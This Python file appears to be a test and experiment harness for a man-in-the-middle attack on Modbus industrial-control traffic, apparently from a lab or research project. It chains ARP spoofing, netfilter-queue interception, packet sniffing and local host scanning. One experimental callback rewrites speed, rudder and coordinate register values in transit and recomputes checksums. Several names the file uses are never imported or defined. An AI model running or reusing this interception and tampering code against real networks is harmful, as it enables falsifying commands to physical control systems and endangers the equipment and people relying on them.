from src.network.hardware import arp_spoofing, sniffing, net_filter_queue, nmap
from src.network import packet_buffer, network_controller, modbus_util, mod_table
import time

class hardware:

    # Passed
    def arp_spoofing():
        spoofer = arp_spoofing.ArpSpoofer()

        spoofer.start(verbose=True)

        input("Press Enter to stop")

        spoofer.stop()

    # Passed
    def net_filter_queue():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        mt = mod_table.ModTable()

        nfq = net_filter_queue.NetFilterQueue(buffer, mt)

        try:
            spoofer.start()
            nfq.start(nfq.show_and_accept)
            input("Press Enter to stop")

        finally:
            nfq.stop()
            spoofer.stop()

    # Passed
    def sniffer_buffer():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        sniffer = sniffing.Sniffer(buffer)

        try:
            spoofer.start()
            sniffer.start(sniffer.put_modbus_in_buffer)

            input("Press Enter to print from buffer (3 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()

            input("Press Enter to print from buffer (2 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (1 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (0 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to stop")
        finally:

            sniffer.stop()
            buffer.clear()
            spoofer.stop()

    # Passed
    def nfq_buffer():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        nfq = net_filter_queue.NetFilterQueue(buffer)

        try:
            spoofer.start()
            nfq.start(nfq.buffer_and_accept)

            input("Press Enter to print from buffer (3 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()

            input("Press Enter to print from buffer (2 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (1 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to print from buffer (0 remaining)")

            buffer.get_last_tuple("packets", "in")[0].show()


            input("Press Enter to stop")
        finally:

            nfq.stop()
            buffer.clear()
            spoofer.stop()
    
    def get_knit_coordinates():
        spoofer = arp_spoofing.ArpSpoofer()

        buffer = packet_buffer.PacketBuffer()

        nfq = net_filter_queue.NetFilterQueue(buffer)

        try:
            spoofer.start()
            nfq.start(nfq.buffer_and_accept)

            input("Press Enter to print from buffer (3 remaining)")

            print(buffer.get_all_positions("in"))


            input("Press Enter to stop")
        finally:

            nfq.stop()
            buffer.clear()
            spoofer.stop()

class network:

    class net:
        def hardware_test():
            net = network_controller.HardwareNetwork()
            try:
                net.start_arp()
                net.start_nfq()

                input("Press Enter to print all positions received")

                print(net.buffer.get_all_positions("in"))
            finally:
                net.stop_arp()
                net.stop_nfq()



# # Experiments for testing problems and new features
class experiments:

    def callback_no_q(pkt):
        spkt = IP(pkt.get_payload())

        if spkt.haslayer("Read Holding Registers Response"):
            mbl = spkt.getlayer(ModbusADUResponse)

            print("Original speed:\t", mbl.payload.registerVal[0])
            print("Original rudder:\t", mbl.payload.registerVal[1])

            mbl.payload.registerVal[0] = 100
            mbl.payload.registerVal[1] = 200

        elif spkt.haslayer("Write Single Register"):
            mbl = spkt.getlayer(ModbusADURequest)

            print("Original coord:\t", mbl.payload.registerValue)
            mbl.payload.registerValue = 90

        else:
            pkt.accept()
            return

        # Recalculate checksums
        del spkt[TCP].chksum
        del spkt[IP].chksum
        del spkt[IP].len

        pkt.set_payload(bytes(spkt))
        pkt.accept()


    def nmap():
        nmap.print_hosts(nmap.get_local_ip())

        print(f"\nYour IP: {nmap.get_local_ip()}")


        ips = nmap.get_host_ips(nmap.get_local_ip())
        
        print("\nLocal devices found:\n","\n".join(ips),"\n\n")

        devices = nmap.get_hosts(nmap.get_local_ip())

        print("Device Information")

        nmap.print_host_info(devices)
        
        device_info = nmap.get_host_info(devices)
        

        


        ip1 = input("Enter ip 1\n\n")
        ip2 = input("Enter ip 2\n\n")

        arp_spoofing.start(ip1, ip2, silence=True)

        input("Press Enter to continue\n\n")

        scapy_sniffing.start(print_console=True, put_buffer=False)

        time.sleep(10)

        scapy_sniffing.stop()
        arp_spoofing.stop()